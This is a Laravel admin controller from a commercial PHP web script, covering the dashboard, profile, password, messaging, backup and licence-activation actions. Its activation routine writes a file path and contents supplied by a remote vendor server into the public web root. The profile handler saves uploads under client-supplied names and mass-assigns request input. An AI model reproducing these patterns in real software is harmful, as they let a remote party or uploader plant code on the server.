<?php

namespace App\Http\Controllers\Admin;

use App\Models\Admin;
use App\Models\Slider;
use App\Models\Service;
use App\Models\Portfolio;
use App\Models\Doctor;
use App\Models\Resume;
use App\Models\Appointment;
use App\Models\AdminUserConversation;
use App\Models\AdminUserMessage;
use App\Models\Counter;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\UserNotification;
use App\Models\Generalsetting;
use App\Classes\GeniusMailer;
use Auth;
use App\Http\Requests\StoreValidationRequest;
use App\Http\Requests\UpdateValidationRequest;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;

use InvalidArgumentException;

use App\Http\Controllers\Controller;

class AdminController extends Controller
{
    public function __construct()
    {
        $this->middleware('auth:admin');
    }

    public function index()
    {
        $specialities = count(Service::all());
        $testimonials = count(Portfolio::all());
        $referrals = Counter::where('type','referral')->orderBy('total_count','desc')->take(5)->get();
        $browsers = Counter::where('type','browser')->orderBy('total_count','desc')->take(5)->get();
        return view('admin.index',compact('referrals','browsers','specialities','testimonials'));
    }

    public function profile()
    {
        return view('admin.profile');
    }

    public function profileupdate(UpdateValidationRequest $request)
    {
        $this->validate($request, [
               'email' => 'unique:admins,email,'.Auth::guard('admin')->user()->id,
           ],[ 
               'email.unique' => 'This email has already been taken.'
            ]);
        $input = $request->all();  
        $admin = Auth::guard('admin')->user();        
            if ($file = $request->file('photo')) 
            {              
                $name = time().$file->getClientOriginalName();
                $file->move('assets/images/admins',$name);
                if($admin->photo != null)
                {
                    if (file_exists(public_path().'/assets/images/admins/'.$admin->photo)) {
                        unlink(public_path().'/assets/images/admins/'.$admin->photo);
                    }
                }            
            $input['photo'] = $name;
            } 

        $admin->update($input);
        Session::flash('success', 'Successfully updated your profile');
        return redirect()->back();
    }

    public function passwordreset()
    {
        return view('admin.reset-password');
    }

    public function changepass(Request $request)
    {
        $admin = Auth::guard('admin')->user();
        if ($request->cpass){
            if (Hash::check($request->cpass, $admin->password)){
                if ($request->newpass == $request->renewpass){
                    $input['password'] = Hash::make($request->newpass);
                }else{
                    Session::flash('unsuccess', 'Confirm password does not match.');
                    return redirect()->back();
                }
            }else{
                Session::flash('unsuccess', 'Current password Does not match.');
                return redirect()->back();
            }
        }
        $admin->update($input);
        Session::flash('success', 'Successfully updated your password');
        return redirect()->back();
    }
    public function messages()
    {
            $convs = AdminUserConversation::all();
            return view('admin.message.index',compact('convs'));            
    }


    public function usercontact(Request $request)
    {
        $data = 1;
        $admin = Auth::guard('admin')->user();

        $gs = Generalsetting::findOrFail(1);
        if($gs->is_smtp == 1)
        {
            $subject = $request->subject;
            $to = $request->to;
            $from = $admin->email;
            $msg = "Email: ".$from."<br>Message: ".$request->message;

            $datas = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];
            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($datas);
        }
        else
        {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to,$subject,$msg,$headers);            
        }

            return response()->json($data);   


    }

    public function generate_bkup()
    {
        $bkuplink = "";
        $chk = file_get_contents('backup.txt');
        if ($chk != ""){
            $bkuplink = url($chk);
        }
        return view('admin.movetoserver',compact('bkuplink','chk'));
    }

    public function clear_bkup()
    {
        $destination  = public_path().'/install';
        $bkuplink = "";
        $chk = file_get_contents('backup.txt');
        if ($chk != ""){
            unlink(public_path($chk));
        }

        if (is_dir($destination)) {
            $this->deleteDir($destination);
        }
        $handle = fopen('backup.txt','w+');
        fwrite($handle,"");
        fclose($handle);
        //return "No Backup File Generated.";
        return redirect()->back()->with('success','Backup file Deleted Successfully!');
    }

    public function activation()
    {
        return view('admin.activation');
    }

    public function activation_submit(Request $request)
    {
        //return config('services.genius.ocean');
        $purchase_code =  $request->pcode;
        $my_script =  'KingCommerce';
        $my_domain = url('/');

        $ch = curl_init();
        curl_setopt ($ch, CURLOPT_URL, config('services.genius.ocean').'purchase112662activate.php?code='.$purchase_code.'&domain='.$my_domain.'&script='.$my_script);
        curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
        $contents = curl_exec($ch);
        curl_close($ch);

        $chk = json_decode($contents,true);

        if($chk['status'] != "success")
        {
            return redirect()->back()->with('unsuccess',$chk['message']);

        }else{
            $this->setUp($chk['p2'],$chk['lData']);
//            DB::table('settings')
//                ->where('id', 1)
//                ->update(['is_active' => 1]);

            return redirect('admin/dashboard')->with('success','Congratulation!! Your System is successfully Activated.');
        }
        //return config('services.genius.ocean');
    }

    function setUp($mtFile,$goFileData){
        $fpa = fopen(public_path().$mtFile, 'w');
        fwrite($fpa, $goFileData);
        fclose($fpa);
    }



    public function movescript(){
        ini_set('max_execution_time', 3000);

        $destination  = public_path().'/install';
        $chk = file_get_contents('backup.txt');
        if ($chk != ""){
            unlink(public_path($chk));
        }

        if (is_dir($destination)) {
            $this->deleteDir($destination);
        }

        $src = base_path().'/vendor/update';
        $this->recurse_copy($src,$destination);
        $files = public_path();
        $bkupname = 'KingCommerce-By-GeniusOcean-'.date('Y-m-d').'.zip';

        $zipper = new \Chumper\Zipper\Zipper;

        $zipper->make($bkupname)->add($files);

        $zipper->remove($bkupname);

        $zipper->close();

        $handle = fopen('backup.txt','w+');
        fwrite($handle,$bkupname);
        fclose($handle);

        if (is_dir($destination)) {
            $this->deleteDir($destination);
        }
        return response()->json(['status' => 'success','backupfile' => url($bkupname),'filename' => $bkupname],200);
    }

    public function recurse_copy($src,$dst) {
        $dir = opendir($src);
        @mkdir($dst);
        while(false !== ( $file = readdir($dir)) ) {
            if (( $file != '.' ) && ( $file != '..' )) {
                if ( is_dir($src . '/' . $file) ) {
                    $this->recurse_copy($src . '/' . $file,$dst . '/' . $file);
                }
                else {
                    copy($src . '/' . $file,$dst . '/' . $file);
                }
            }
        }
        closedir($dir);
    }

    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }



}
